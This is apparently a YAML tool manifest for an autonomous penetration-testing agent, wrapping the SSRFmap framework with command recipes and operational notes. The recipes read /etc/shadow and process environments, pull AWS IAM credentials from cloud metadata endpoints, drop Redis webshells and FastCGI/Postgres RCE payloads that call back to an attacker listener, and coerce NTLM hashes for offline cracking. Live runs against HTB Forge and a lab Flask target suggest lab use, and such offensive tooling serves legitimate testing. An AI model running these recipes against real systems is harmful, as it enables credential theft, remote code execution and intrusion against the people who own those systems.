name: ssrfmap
kind: cli
binary: bash
version: "swisskyrepo-master"
description: "SSRF exploitation framework via swisskyrepo/SSRFmap CLI (24 module files / 23 usable exploit modules + 1 skeleton template: readfiles + cloud-metadata per-provider (aws/gce/azure/digitalocean/alibaba) + portscan/networkscan + gopher-encoded backend services (redis/mysql/fastcgi/memcache/postgres/smtp/zabbix) + tomcat manager + github enterprise + axfr DNS zone transfer + smbhash UNC NTLM coercion + consul KV + docker socket + socksproxy + custom). Migrated kind:mcp → kind:cli May 2026 (daemon-wrapper retirement series, Tier A; 597-LOC Python `requests` re-implementation wrapper that never invoked the real SSRFmap collapsed to 22-LOC RunCliServer stub — kind:cli flip exposes the FULL 23-module surface vs wrapper's 2 effectively-implemented modules). Diff-based extraction: SSRFmap sends a baseline request first, then diffs each SSRF response against it, writing the diff to /opt/ssrfmap/<host_or_host_port>/ — recipes auto-cp to /session/output/ssrfmap/. For simple HTTP-only SSRF probes (one-shot file:// or one cloud-metadata URL with full response capture), curl can be faster + more transparent; use ssrfmap for: (a) automated module-driven iteration, (b) gopher-encoded binary-protocol exploitation, (c) -l http reverse-shell handler, (d) WAF-bypass payload variants (IP-encoding only — see gotcha for case-variant gap)."
image: "ghcr.io/silicon-works/mcp-tools-ssrfmap:latest"
image_size_mb: 362

# Stateless per-call — each ssrfmap invocation builds payloads, fires
# them, captures via diff, exits. No daemon. Long modules (networkscan
# of large subnet, full --level 5 with all WAF bypasses) can reach
# minutes — 600s cap leaves headroom.
idle_timeout_seconds: 300
max_runtime_seconds: 600
timeout_seconds: 600

capabilities:
  - ssrf_exploitation
  - cloud_metadata_extraction
  - gopher_payload_generation
  - backend_service_rce
  - smb_hash_coercion

phases:
  - exploitation

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 256
  cpu: 0.5

routing:
  use_for:
    - "exploit SSRF vulnerability — automated module-driven iteration through readfiles / portscan / cloud-metadata / gopher chains"
    - "extract AWS/GCE/Azure/DigitalOcean/Alibaba cloud instance metadata via SSRF (per-provider aws/gce/azure/digitalocean/alibaba modules)"
    - "attack backend services through SSRF using gopher-encoded payloads (Redis CONFIG SET webshell drop, MySQL UDF, FastCGI RCE, Memcached injection, Postgres COPY FROM PROGRAM)"
    - "port scan internal network through SSRF (portscan / networkscan modules)"
    - "bypass WAF protections via --level 1-5 (decimal IP, hex IP, @-bypass, double-URL-encoding)"
    - "SSRF-driven NTLM hash capture via UNC injection (smbhash module — pairs with responder for hash collection)"
    - "Docker socket exploitation via SSRF (docker module)"
    - "DNS AXFR zone transfer via SSRF (axfr module)"
    - "Consul / Tomcat / GitHub Enterprise specific endpoints via SSRF (consul / tomcat / github modules)"
  never_use_for:
    - "basic one-shot HTTP request through SSRF (use curl directly — faster and shows the response body inline)"
    - "non-SSRF web vulnerability scanning (use nuclei)"
    - "direct service exploitation without SSRF — for direct Redis access use netcat with raw protocol, for direct MySQL use the mysql tool"
    - "SSRF DETECTION (finding whether a parameter is SSRF-vulnerable in the first place) — use nuclei with SSRF templates first; ssrfmap is for EXPLOITATION after detection"
  triggers:
    - "SSRF"
    - "server-side request forgery"
    - "ssrfmap"
    - "cloud metadata"
    - "169.254.169.254"
    - "instance metadata"
    - "gopher payload"
    - "internal service access through SSRF"
    - "AWS credentials via SSRF"
    - "Redis exploit via SSRF"
    - "MySQL exploit via SSRF"
    - "NTLM hash via SSRF"
    - "Tomcat manager SSRF"
  prefer_over: []

see_also:
  - tool: curl
    reason: "Use `curl` for one-shot manual SSRF testing where you need to SEE the response body inline (curl returns the body; ssrfmap captures via diff-to-disk). After ssrfmap discovers which payload works, agent often re-runs the SAME payload via curl to capture and inspect the response body manually. Two-tool workflow: ssrfmap for module-driven iteration + WAF bypass variants; curl for response inspection."
  - tool: nuclei
    reason: "Use `nuclei -t ssrf/` to DETECT SSRF vulnerabilities first (nuclei has 100+ SSRF templates). Once a parameter is confirmed SSRF-vulnerable, escalate to `ssrfmap` for exploitation. nuclei = detection, ssrfmap = exploitation."
  - tool: nc
    reason: "Pair with `nc` v2.0 held-listener pattern for SSRFmap's reverse-conn modules: agent starts an nc listener on tun0:PORT first, then runs `ssrfmap -m redis --lhost ATTACKER_TUN0_IP --lport PORT -l PORT` so the gopher-encoded Redis CONFIG SET payload calls back to the listener (alternatively, `-l PORT` starts SSRFmap's INTERNAL handler — use nc when external listener is preferred, e.g. for multi-callback debugging)."
  - tool: responder
    reason: "Pair with `responder` for `-m smbhash` UNC NTLM hash capture: agent starts responder on attacker tun0 first (Pattern R3 SMB-only mode), then SSRFmap's smbhash module triggers UNC `\\\\attacker_ip\\share` injection via the SSRF parameter; responder captures the NTLMv2 hash on the SMB port. Followed by hashcat 5600 (NetNTLMv2) for offline crack."
  - tool: aws
    reason: "After SSRFmap's `aws` module extracts IAM credentials (written to /opt/ssrfmap/<host>_<port>/iam-* files), feed to the `aws` tool (kind:cli vendor wrap of awslabs.aws-api-mcp-server) for full AWS enumeration: STS GetCallerIdentity, IAM list policies, S3 enum, EC2 enum, etc."
  - tool: hash-lookup
    reason: "After ssrfmap's `smbhash` (via responder) captures NTLMv2, before spending hashcat cycles, check public pre-cracked databases via `hash-lookup` (hashes.com, NIST)."

target_extraction: []
target_extraction_reason: "SSRFmap takes a request file (-r REQFILE) where the target is encoded inside the raw HTTP request's Host: header + URL. No top-level positional target arg suitable for extraction."

reject_flags: []
reject_flags_reason: "SSRFmap's argv shape is `-r REQFILE -p PARAM -m MODULE [...]` — no remote-target arg shape that needs filtering."

usage_patterns:

  - name: "Pattern SM0 — write request file (prerequisite for all other patterns)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/ssrfmap && cat > /session/output/ssrfmap/req.txt <<EOF\nPOST /<vulnerable_path> HTTP/1.1\nHost: <target_host>:<port>\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\nCookie: <cookies-if-needed>\nContent-Length: <length>\n\n<param>=SSRFmap\nEOF\necho written'"
    when: "Prerequisite for ALL SSRFmap module patterns. SSRFmap reads a raw HTTP request file via -r and replaces the value of the parameter named in -p with the payload. Format: standard raw HTTP with \\r\\n line endings (heredoc handles this since the body needs blank-line separator before form data). The parameter VALUE in the request body can be anything (SSRFmap overwrites it with each test payload). For GET-based SSRF use `GET /path?param=PLACEHOLDER HTTP/1.1` and the same -p flag. Agent uses the Write tool for multi-line content with special chars; this Pattern's heredoc is the inline-string variant. Verify file is well-formed: `cat /session/output/ssrfmap/req.txt | head -10`."

  - name: "Pattern SM1 — readfiles module (default: /etc/passwd, /etc/shadow, /proc/self/environ, etc.)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt -p <param> -m readfiles --logfile /session/output/ssrfmap/run.log; cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null; ls -la /session/output/ssrfmap/<host>_<port>/ 2>/dev/null'"
    when: "Default readfiles iterates 11 common targets: /etc/passwd, /etc/shadow, /etc/lsb-release, /etc/hosts, /proc/self/environ, /proc/self/cmdline, /proc/self/cwd/index.php, /proc/self/cwd/application.py, /proc/self/cwd/main.py, /proc/self/exe (binary). Extracted content lands at /opt/ssrfmap/<host>_<port>/_etc_passwd etc. (via SSRFmap's diff-based extraction — sends baseline first, then writes diff). Recipe cp's to /session/output/ssrfmap/ for agent access. Custom file list via `--rfiles 'path1,path2,path3'`. Verified live 2026-05-17 against urllib-based Flask SSRF target: full /etc/passwd + /etc/shadow + /proc/self/exe (10 MB ELF) captured."

  - name: "Pattern SM2 — portscan / networkscan (internal-network discovery via SSRF)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt -p <param> -m <portscan_or_networkscan> --logfile /session/output/ssrfmap/run.log 2>&1 | sed -E \"s/\\x1b\\[[0-9;]*m//g\"'"
    when: "portscan: tests common ports (21, 22, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 6379, 8080, etc.) by trying http://127.0.0.1:PORT/ via the SSRF param. networkscan: same but iterates a subnet. Output is timestamped + ANSI-colored (e.g. `[16:31:39] IP:127.0.0.1, Found <red>filtered</red> port n°443`). Recipe pipes through `sed` to strip ANSI codes for parseable output. Results in stdout (not the cp'd dir since portscan doesn't extract file content)."

  - name: "Pattern SM3 — cloud metadata (aws / gce / azure / digitalocean / alibaba)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt -p <param> -m <cloud_provider> --logfile /session/output/ssrfmap/run.log; cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null; ls -la /session/output/ssrfmap/<host>_<port>/ 2>/dev/null'"
    when: "Per-provider modules: `-m aws` (hits 169.254.169.254/latest/meta-data/iam/security-credentials/ + user-data + public-keys); `-m gce` (hits metadata.google.internal/computeMetadata/v1/?recursive=true); `-m azure` (hits 169.254.169.254/metadata/instance); `-m digitalocean` (hits 169.254.169.254/metadata/v1/); `-m alibaba` (hits 100.100.100.200/latest/meta-data/). Extracted creds land at /opt/ssrfmap/<host>_<port>/iam-security-credentials or user-data etc. — agent reads + extracts AccessKeyId/SecretAccessKey/Token via grep or jq. Major upgrade vs legacy wrapper which lumped all clouds into one `exploit_metadata` method."

  - name: "Pattern SM4 — gopher-encoded backend service exploitation (redis / mysql / fastcgi / postgres / memcache / smtp / zabbix)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt -p <param> -m <service> --lhost <attacker_tun0> --lport <listener_port> -l http --logfile /session/output/ssrfmap/run.log; cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null'"
    when: "Generates and sends gopher://<host>:<port>/_<encoded-protocol-bytes> payloads through the SSRF param. Modules: `-m redis` (gopher to 6379, FLUSHALL+SET+CONFIG SET dir+dbfilename+SAVE for webshell drop OR cron job); `-m mysql` (gopher to 3306, custom SQL via binary auth handshake); `-m fastcgi` (gopher to 9000, FastCGI RCE chain); `-m postgres` (gopher to 5432, COPY FROM PROGRAM); `-m memcache` (gopher to 11211, text protocol injection); `-m smtp` (gopher to 25, mail relay); `-m zabbix` (gopher to 10050, agent RCE). --lhost and --lport are CRITICAL for redis/fastcgi — they point the dropped webshell or cron at attacker's listener. `-l http` starts SSRFmap's INTERNAL HTTP-handler listener (caveat verified live 2026-05-17: `-l` takes a HANDLER NAME, not a port number — only handler available is `http`; passing `-l 4444` or any other string fails with `[ERROR]:Invalid no such handler: 4444`). For non-HTTP reverse shells, use an EXTERNAL nc listener via the nc tool (set --lhost --lport to the nc listener, omit -l entirely)."

  - name: "Pattern SM5 — smbhash UNC NTLM coercion (pairs with responder)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt -p <param> -m smbhash --lhost <attacker_tun0> --logfile /session/output/ssrfmap/run.log'"
    when: "Injects UNC path `\\\\<attacker_tun0>\\share` into the SSRF param — target tries to authenticate to attacker's SMB share, sending NTLMv2 hash. Must be paired with responder running on attacker (Pattern R3 SMB-only mode): start responder FIRST on the agent (`mcp_tool responder/run_cli` Pattern R3, captures hashes to /session/output/responder/logs/), THEN run this Pattern SM5 — responder captures the NTLMv2 hash for offline crack via hashcat -m 5600. Requires the target's HTTP-fetcher backend to be Windows-based OR a Linux backend using a library that follows UNC paths (rare but exists in some PHP/Java configurations)."

output_formats:
  - flag: ""
    format: "text"
    preferred: true
    notes: "Mixed text output: banner + module-launched message on stdout; verbose log via --logfile FILE (recommended: /session/output/ssrfmap/run.log). For modules with diff-extraction (readfiles, aws, gce, etc.), captured RESPONSE BODIES (the actual extracted file contents) land at /opt/ssrfmap/<host>_<port>/<filename> on disk — recipes cp to /session/output/ssrfmap/. Stdout may contain ANSI escape codes (portscan/networkscan); strip with sed/python before parsing."

common_options:
  required:
    - "-r REQFILE — raw HTTP request file (Pattern SM0 generates this)"
    - "-p PARAM — name of the SSRF-vulnerable parameter (query string, POST body, or header)"
    - "-m MODULE — one of 23 usable modules: alibaba, aws, axfr, consul, custom, digitalocean, docker, fastcgi, gce, github, httpcollaborator, memcache, mysql, networkscan, portscan, postgres, readfiles, redis, smbhash, smtp, socksproxy, tomcat, zabbix. (`template` also exists in /opt/ssrfmap/modules/ but is a skeleton-only template, not a real exploit — `-m template` would load but do nothing useful)"
  reverse_handler:
    - "-l http — start SSRFmap's INTERNAL reverse-shell handler. NOTE: -l takes a HANDLER NAME from /opt/ssrfmap/handlers/, NOT a port number; only `http` is available in this image (live-caught 2026-05-17: -l 4444 fails with 'Invalid no such handler: 4444'). For non-HTTP callbacks, omit -l and use external nc listener via --lhost/--lport"
    - "--lhost HOST — attacker IP for reverse-connection payloads (tun0 IP on HTB; agent's interface IP)"
    - "--lport PORT — attacker port for reverse-connection payloads (matches the -l value OR external nc -lvnp port)"
    - "--ldomain DOMAIN — for axfr / domain-related modules; the target's domain"
  payload_tuning:
    - "--rfiles 'path1,path2,...' — custom files list for readfiles module (comma-separated)"
    - "--level N — WAF-bypass level 1-5 (default 1); effect varies by module — for IP-based modules adds decimal/hex/octal/@-bypass variants; for path-based modules adds URL-encoding variants"
  http_layer:
    - "--ssl — use HTTPS (no cert verification) for the request to the SSRF endpoint itself"
    - "--proxy URL — route ssrfmap's HTTP requests through a proxy (e.g., http://127.0.0.1:8080 for Burp inspection during recipe debugging)"
    - "--uagent 'STRING' — override User-Agent in the request"
  output:
    - "--logfile FILE — redirect verbose log to FILE (default: /opt/ssrfmap/SSRFmap.log)"
    - "-v — verbose mode (logs every request payload + response status)"

gotchas:
  - "PATH A FLIP (May 2026): the legacy 597-LOC wrapper was a Python `requests` re-implementation that never invoked the real SSRFmap binary at /opt/ssrfmap/ssrfmap.py. Migration EXPOSES the 24-module real surface vs the wrapper's 2 effectively-implemented modules (readfiles, portscan). Net gain: aws/gce/azure/digitalocean/alibaba (per-cloud, vs wrapper's lumped exploit_metadata), redis/mysql/fastcgi/postgres (real binary-protocol gopher generation, vs wrapper's url_quote stub), smbhash, axfr, consul, docker, socksproxy, tomcat, zabbix, httpcollaborator, networkscan."

  - "REQUEST FILE FORMAT (Pattern SM0): standard raw HTTP request with \\r\\n line endings. heredoc (`cat <<EOF`) preserves the format. The parameter VALUE in the request body can be anything (SSRFmap rewrites it). For GET-based SSRF: `GET /path?param=PLACEHOLDER HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n`. For POST with form: blank line + body with `param=PLACEHOLDER&other=value`. For POST with JSON: `Content-Type: application/json\\r\\n\\r\\n{\"param\":\"PLACEHOLDER\"}` (with `-p param`). Verified live 2026-05-17 — pyftpdlib-style synthetic Flask target accepted standard heredoc format."

  - "CAPTURED FILES → /opt/ssrfmap/<host_or_host_port>/: SSRFmap's diff-based extraction writes captured response data (the actual extracted file contents) to a directory NAMED AFTER THE REQUEST FILE'S Host HEADER VERBATIM (colon replaced with underscore), in /opt/ssrfmap REGARDLESS of agent-side cwd. Directory naming varies by Host header format: `Host: forge.htb` → `/opt/ssrfmap/forge.htb/`; `Host: 127.0.0.1:5000` → `/opt/ssrfmap/127.0.0.1_5000/`. Every Pattern recipe MUST include cp post-steps for BOTH forms: `cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null`. Verified live 2026-05-17: synthetic Flask target (Host: 127.0.0.1:15050) → /opt/ssrfmap/127.0.0.1_15050/ captured /etc/passwd + /etc/shadow + /proc/self/exe (10 MB); HTB Forge target (Host: forge.htb, no port) → /opt/ssrfmap/forge.htb/ confirmed the host-vs-host:port distinction. Gotcha #17 (DIRECTORY NAME DEPENDS ON HOST HEADER FORMAT) overlaps with this — both are kept for clarity."

  - "DIFF-BASED EXTRACTION CAN MISS DYNAMIC RESPONSES: SSRFmap sends a BASELINE request (empty SSRF payload) first, captures baseline body, then for each SSRF test payload computes `diff = response.text - default.text`. If the target's response body is DYNAMIC (timestamps, randomized error pages, anti-CSRF tokens that change per-request), the diff will contain noise that masks the actual extraction. Mitigation: use --proxy to inspect raw responses in Burp, OR for one-off confirmation use curl directly with a single payload to see the full response body."

  - "ANSI ESCAPE CODES IN STDOUT (portscan, networkscan): SSRFmap colorizes 'filtered'/'open' status with ANSI codes (\\x1b[31m...\\x1b[0m). Recipe pipes through `sed -E 's/\\x1b\\[[0-9;]*m//g'` to strip codes before agent parsing. Other modules with extraction-to-disk (readfiles, aws, etc.) don't need this since their data lands in files, not stdout."

  - "--level NUMBER (1-5) EFFECT VARIES BY MODULE: not a uniform 'try N more encodings' — for IP-based modules (readfiles, portscan) it adds decimal-IP / hex-IP / octal-IP / @-bypass variants of 127.0.0.1; for path-based modules it adds URL-encoding variants. Some modules ignore --level entirely. Verified live: --level 1 and --level 5 produced same payload count for readfiles (the module iterates its 11 fixed file paths, not encoding variants)."

  - "-l HANDLER_NAME vs --level: easy to confuse. `-l` takes a HANDLER NAME, NOT a port number (caught live 2026-05-17: passing `-l 4444` fails with `[ERROR]:Invalid no such handler: 4444`). SSRFmap's --help example `-l 4242` is MISLEADING — that 4242 only works because no handler is loaded; failing silently. The actual handlers live in /opt/ssrfmap/handlers/; only `http.py` exists in this image, so `-l http` is the ONLY valid form. For non-HTTP callbacks, omit `-l` and use an external nc listener (--lhost --lport pointing at the nc tool). `--level NUMBER` is the WAF-bypass level (separate flag)."

  - "REVERSE-HANDLER ALTERNATIVES: for redis/fastcgi/mysql modules, the dropped payload calls back to --lhost:--lport. Two options: (a) `-l <port>` makes SSRFmap itself listen internally (simpler, suitable for one-shot); (b) external `nc` tool listener (more flexible, supports multi-callback debugging, survives if ssrfmap crashes). Cross-tool see_also documents both."

  - "GOPHERUS RETIRED (May 2026): the legacy Dockerfile cloned tarunkant/Gopherus (Python2-only tool) to /opt/gopherus, but Python2 is NOT installed in the image (`python2: command not found`) — Gopherus has never worked in this image. The wrapper never invoked it either. Removed from Dockerfile in the Tier A flip. Gopher payload generation is now handled by SSRFmap's per-module gopher logic (redis.py, mysql.py, fastcgi.py — all working under Python3)."

  - "VERBOSE OUTPUT IS NOISY: -v prints every request payload + response status to stdout, which can be 100+ lines per module run. Recipes redirect via `--logfile /session/output/ssrfmap/run.log` so verbose info goes to file, not stdout. Then agent inspects log: `tail -50 /session/output/ssrfmap/run.log` or `grep -E 'Reading|Writing|Found|Error' /session/output/ssrfmap/run.log`."

  - "WHEN TO PREFER CURL DIRECTLY: simple one-shot SSRF — agent has a single payload, wants the response body inline. e.g. `curl -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name' http://target/ssrf` returns the IAM credentials JSON directly. ssrfmap would do the same via -m aws + cp, but adds round-trip complexity. Use ssrfmap when (a) iterating multiple payloads (readfiles' 11 paths, portscan's 19+ ports), (b) generating gopher encoding for binary protocols, (c) WAF bypass variants, (d) reverse-shell handler integration."

  - "SMBHASH REQUIRES WINDOWS-FRONTING-BACKEND OR UNC-FOLLOWING LIBRARY: the smbhash module injects `\\\\attacker\\share` into the SSRF parameter. The TARGET'S backend must actually try to fetch that UNC path. Windows IIS/asp.net does; Linux backends only do if using a library that follows UNC (PHP curl with certain flags, some Java libs). Test with smbhash + tcpdump on attacker for incoming SMB packets before trusting it."

  - "CONTAINER MUST BE FRESHLY-SPAWNED OR CWD RESET: the diff-extraction directory naming uses `request_host:port` from the request file — if a previous run left files in /opt/ssrfmap/127.0.0.1_5000/, subsequent runs against the same host:port APPEND/OVERWRITE there. The `cp -rn` flag means 'don't overwrite existing', so newer extractions get the new content but old files persist. For clean per-run isolation, agent can `rm -rf /opt/ssrfmap/<host>_<port>/` BEFORE invoking the next Pattern, or use different target host:port between runs."

  - "PROXY FOR DEBUGGING: --proxy http://attacker:8080 routes ALL of ssrfmap's HTTP traffic through a Burp/mitmproxy listener — agent can spawn a simple mitmdump in a sibling container to capture full request/response bodies including the data ssrfmap's diff would have missed. Useful when (a) the target's response is dynamic and diff is broken, (b) confirming WAF bypass behavior, (c) debugging request-file format issues."

  - "EXAMPLE REQUEST FILES BUNDLED: /opt/ssrfmap/examples/ has request.txt / request2.txt / etc. and example.py (a Flask target with /ssrf endpoint for offline testing). Agent can `cat /opt/ssrfmap/examples/request.txt` to see the canonical format reference."

  - "WAF-BYPASS ARSENAL GAP — `--level 5` is IP-encoding-only: SSRFmap's `--level 1-5` flag generates payload variants targeting IP-based blacklists (decimal `2130706433`, hex `0x7f000001`, octal-IP, @-bypass `http://example.com@127.0.0.1`, IPv6 literals `[::1]`). It does NOT generate CASE-VARIANT hostname variants (LOCALHOST, LocalHost). Targets with case-sensitive lowercase-only blacklists (e.g. HTB Forge blocks literal `localhost`/`127.0.0.1` but allows `LOCALHOST`) DEFEAT the standard arsenal completely — verified live 2026-05-17 against Forge: 3540 payloads from --level 5 portscan, 0 ports found. Workaround: use `-m custom` with hand-crafted payloads, OR fall back to direct curl through the SSRF param (the case-variant bypass is more easily applied in curl than as a SSRFmap module modification)."

  - "CAPTURED-FILES DIRECTORY NAME DEPENDS ON HOST HEADER FORMAT: SSRFmap names the extraction directory after the request file's Host header literally — `Host: forge.htb` → `/opt/ssrfmap/forge.htb/`; `Host: 127.0.0.1:5000` → `/opt/ssrfmap/127.0.0.1_5000/`. The colon-to-underscore replacement happens, but the port is INCLUDED only when the Host header has one. cp post-step should attempt BOTH forms: `cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null` to handle both. Verified live 2026-05-17 — Forge request used `Host: forge.htb` (no port) → directory is `forge.htb/` not `forge.htb_80/`."

  - "FORGE-STYLE TARGETS — when SSRFmap CAN'T help: targets that block file:// at protocol filter AND have case-sensitive hostname blacklists (verified live on HTB Forge 2026-05-17) defeat SSRFmap's stock arsenal: readfiles needs file:// (blocked), portscan needs IP-encoded http:// (blocked too because Forge's filter strips numeric forms via Python requests not parsing them as IPs). For these targets, agent uses direct curl with the case-variant bypass + the chained-SSRF / internal-admin-vhost trick. SSRFmap's actual sweet spot: cloud-metadata extraction (no file://, just http:// to metadata endpoints) + gopher-encoded backend services + portscan when target permits internal-IP fetches."

failure_signatures:
  - signal: "[INFO]:Empty response"
    layer: "ssrf"
    remediation: "SSRFmap sent payloads but got no response data back. Possible causes: (1) SSRF parameter doesn't actually trigger backend fetch — verify with curl directly that the param accepts URLs; (2) target's backend fetcher rejects the file:// or http://internal scheme (modern curl with --proto restrictions); (3) target is hardened against SSRF (blocking 127.0.0.1, 169.254.169.254, RFC1918). Try Pattern SM2 portscan first to confirm SSRF DOES reach internal ports, then return to SM1 readfiles."

  - signal: "Connection refused"
    layer: "tcp"
    remediation: "Target's BACKEND (the server that fetches the SSRF URL) couldn't reach the requested resource. For portscan: this IS the expected result for closed ports (filtered/open differentiation). For other modules: the internal service isn't running (e.g. Redis not at 6379), wrong host (try --lhost adjustments), or the SSRF doesn't reach that subnet."

  - signal: "Module 'X' not found"
    layer: "config"
    remediation: "Module name typo or invalid module. Check valid list: alibaba/aws/axfr/consul/custom/digitalocean/docker/fastcgi/gce/github/httpcollaborator/memcache/mysql/networkscan/portscan/postgres/readfiles/redis/smbhash/smtp/socksproxy/template/tomcat/zabbix. Use lowercase. `template` is a module-template skeleton, not a real exploit module."

  - signal: "Error: argument -r/--reqfile: required"
    layer: "args"
    remediation: "Missing -r REQFILE flag. Run Pattern SM0 first to write the request file to /session/output/ssrfmap/req.txt, then chain into the next Pattern's recipe."

  - signal: "SyntaxError: invalid syntax"
    layer: "parse"
    remediation: "Request file malformed — likely missing \\r\\n line endings or missing blank line between headers and body. Re-run Pattern SM0 with heredoc OR Write tool to regenerate. Check: `cat /session/output/ssrfmap/req.txt | head` — should look like standard HTTP request with separator blank line before body."

  - signal: "cp: cannot stat '/opt/ssrfmap/<host>_<port>/': No such file or directory"
    layer: "fs"
    remediation: "The diff-extraction directory wasn't created — meaning SSRFmap didn't find any extractable data (empty diff for every payload, target returns same body regardless of SSRF). For readfiles: the target's backend may be Linux without /etc/passwd-readability OR using a fetcher that rejects file://. For cloud-metadata: target may not be a cloud instance, or metadata IMDSv2 token-required mode is enabled (older SSRFmap doesn't handle IMDSv2). The cp error is benign — just means no files captured. Recipe uses `2>/dev/null` to swallow it."

help_commands:
  - name: "ssrfmap top-level help"
    binary: "python3"
    command: "/opt/ssrfmap/ssrfmap.py --help"
    when: "Show all CLI flags (-r, -p, -m, -l, --lhost, --lport, --ldomain, --rfiles, --uagent, --ssl, --proxy, --level, --logfile, -v). target=null."
  - name: "ssrfmap module list (filesystem inspection)"
    binary: "bash"
    command: "-c 'ls /opt/ssrfmap/modules/ | sed \"s/.py$//\" | grep -v __init__ | tr \"\\n\" \" \"'"
    when: "Print the 24 available modules. target=null."
  - name: "ssrfmap example request file (canonical format reference)"
    binary: "cat"
    command: "/opt/ssrfmap/examples/request.txt"
    when: "Show a working request.txt format that ssrfmap accepts — POST with form-urlencoded body, blank line separator. target=null."
